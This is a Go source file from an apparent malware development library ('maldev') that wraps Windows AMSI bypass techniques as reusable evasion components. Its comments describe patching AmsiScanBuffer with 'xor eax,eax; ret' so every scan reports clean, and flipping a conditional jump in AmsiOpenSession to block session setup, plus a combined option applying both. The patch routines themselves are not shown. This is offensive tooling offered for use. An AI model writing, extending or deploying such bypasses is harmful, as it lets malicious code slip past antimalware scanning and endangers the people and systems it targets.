//go:build windows

package amsi

import (
	"github.com/oioio-space/maldev/evasion"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func toCaller(c evasion.Caller) *wsyscall.Caller {
	if c == nil {
		return nil
	}
	if wc, ok := c.(*wsyscall.Caller); ok {
		return wc
	}
	return nil
}

type scanBufferPatch struct{}

func (scanBufferPatch) Name() string                  { return "amsi:ScanBuffer" }
func (scanBufferPatch) Apply(c evasion.Caller) error  { return PatchScanBuffer(toCaller(c)) }

// ScanBufferPatch returns a Technique that patches AmsiScanBuffer to return S_OK.
// How it works: overwrites the function entry point with xor eax,eax; ret (3 bytes).
// AMSI then reports all scans as clean. Returns nil if amsi.dll is not loaded.
func ScanBufferPatch() evasion.Technique { return scanBufferPatch{} }

type openSessionPatch struct{}

func (openSessionPatch) Name() string                  { return "amsi:OpenSession" }
func (openSessionPatch) Apply(c evasion.Caller) error  { return PatchOpenSession(toCaller(c)) }

// OpenSessionPatch returns a Technique that patches AmsiOpenSession.
// How it works: scans for a JZ conditional jump and flips it to JNZ,
// preventing AMSI session initialization.
func OpenSessionPatch() evasion.Technique { return openSessionPatch{} }

type allPatch struct{}

func (allPatch) Name() string                  { return "amsi:All" }
func (allPatch) Apply(c evasion.Caller) error  { return PatchAll(toCaller(c)) }

// All returns a Technique that applies both ScanBuffer and OpenSession patches.
func All() evasion.Technique { return allPatch{} }
